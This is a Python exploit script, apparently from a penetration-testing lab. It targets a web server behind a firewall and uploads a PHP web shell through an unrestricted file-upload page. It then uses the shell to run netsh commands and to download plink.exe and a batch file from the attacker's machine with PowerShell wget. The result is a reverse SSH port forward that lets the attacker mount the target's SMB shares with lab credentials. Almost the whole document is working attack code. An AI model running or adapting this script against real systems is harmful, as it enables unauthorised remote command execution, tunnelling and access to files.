#!/usr/bin/python
import sys, requests, os, time, signal

arg_length = len(sys.argv)

if(arg_length < 3): 
    print("[!] Not enough arguments passed to the script.")
    print("[>] Usage: " + sys.argv[0] + " <FIREWALL IP> <ATTACKER IP>\n")
    sys.exit()

if(arg_length > 4): 
    print("[!] Too many arguments passed to the script.")
    print("[>] Usage: " + sys.argv[0] + " <FIREWALL IP> <ATTACKER IP>\n")
    sys.exit()

robots_url = "http://" + sys.argv[1] + "/robots.txt"
upload_url = "http://" + sys.argv[1] + "/simple_upload/upload_file.php"
backdoor_url = "http://" + sys.argv[1] + "/simple_upload/uploaded_files/sb.php?cmd="

robots_get = requests.get(robots_url)
if(robots_get.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Contents of the robots.txt:")
    print(robots_get.text)

post_request_headers = {
    'Host': sys.argv[0],
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------137588257440422773621356336789',
    'Content-Length': '5862',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

port_request_data = """
-----------------------------137588257440422773621356336789
Content-Disposition: form-data; name="uploadedFile"; filename="sb.php"
Content-Type: application/x-php

<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

-----------------------------137588257440422773621356336789
Content-Disposition: form-data; name="uploadBtn"

Upload
-----------------------------137588257440422773621356336789--
"""

upload_backdoor_post = requests.post(upload_url, data=port_request_data, headers=post_request_headers)
if(upload_backdoor_post.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Backdoor successfully uploaded.")

ipv4 = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()

cleanup_forward_url = backdoor_url + "netsh%20interface%20portproxy%20reset"
cleanup_forward_get = requests.get(cleanup_forward_url)
if(cleanup_forward_get.status_code != 200):
    print("[!] Error while performing initial cleanup")
    sys.exit()

cleanup_rule_url = backdoor_url + "netsh%20advfirewall%20firewall%20del%20rule%20name=%22forward_port_rule%22"
cleanup_rule_get = requests.get(cleanup_rule_url)
if(cleanup_rule_get.status_code != 200):
    print("[!] Error while performing initial cleanup")
    sys.exit()

os.popen("systemctl start apache2")
os.popen("systemctl start ssh")
time.sleep(4)
ssh_hostkey = os.popen('ssh-keyscan localhost | ssh-keygen -lvf - | grep "ED25519"').read().strip()
ssh_hostkey = ssh_hostkey.split(" ")
ssh_hostkey = str(ssh_hostkey[1])
ssh_hostkey_format = ssh_hostkey.replace("/", "\\/")

os.popen("cp -f plink.exe /var/www/html/")
os.popen("cp -f remote_pf.bat /var/www/html/")
time.sleep(4)
os.popen("sed -i 's/ATTACKERIP/" + ipv4 + "/g' /var/www/html/remote_pf.bat")
os.popen("sed -i 's/ATTACKERHOSTKEY/" + ssh_hostkey_format + "/g' /var/www/html/remote_pf.bat")
time.sleep(4)
os.popen("chmod 777 /var/www/html/plink.exe")
os.popen("chmod 777 /var/www/html/remote_pf.bat")

wget_egress_url = backdoor_url + "powershell.exe%20wget%20-Uri%20http://" + ipv4 + "/plink.exe%20-OutFile%20plink.exe"
wget_egress_get = requests.get(wget_egress_url)
if(wget_egress_get.status_code != 200):
    print("[!] Error while attempting to upload plink.exe")
    sys.exit()
else:
    print("[+] plink.exe successfully uploaded.")

wget_remote_url = backdoor_url + "powershell.exe%20wget%20-Uri%20http://" + ipv4 + "/remote_pf.bat%20-OutFile%20remote_pf.bat"
wget_remote_get = requests.get(wget_remote_url)
if(wget_remote_get.status_code != 200):
    print("[!] Error while attempting to upload remote_pf.bat")
    sys.exit()
else:
    print("[+] remote_pf.bat successfully uploaded")

print("[>] Setting up remote port forward")
os.popen("curl --url " + backdoor_url + "remote_pf.bat /dev/null 2>&1")
print("[+] Remote port forward successfully set, you can now attempt to list and mount the shares using the following commands:")
print("\tsudo smbclient -L 127.0.0.1 --port=1234 --user=Administrator%lab")
print("\tsudo mkdir /root/share/")
print("\tsudo mount -t cifs -o username=Administrator,password=lab,port=1234 //127.0.0.1/htdocs /root/share")
input("[>] Press ENTER to terminate the remote port forward and exit the script")
curl_pid = os.popen("ps -ef | awk '/curl/{ print $2; exit }'").read().strip()
os.popen("kill -9 " + curl_pid)
time.sleep(1)
curl_pid = os.popen("ps -ef | awk '/curl/{ print $2; exit }'").read().strip()
os.popen("kill -9 " + curl_pid)
time.sleep(1)
ssh_tunnel_pid = os.popen('ss -antp | grep "LISTEN" | grep "1:1234"').read().strip()
ssh_tunnel_pid = ssh_tunnel_pid.split("=")
ssh_tunnel_pid = str(ssh_tunnel_pid[1]).split(",")
os.popen("kill -9 " + ssh_tunnel_pid[0])
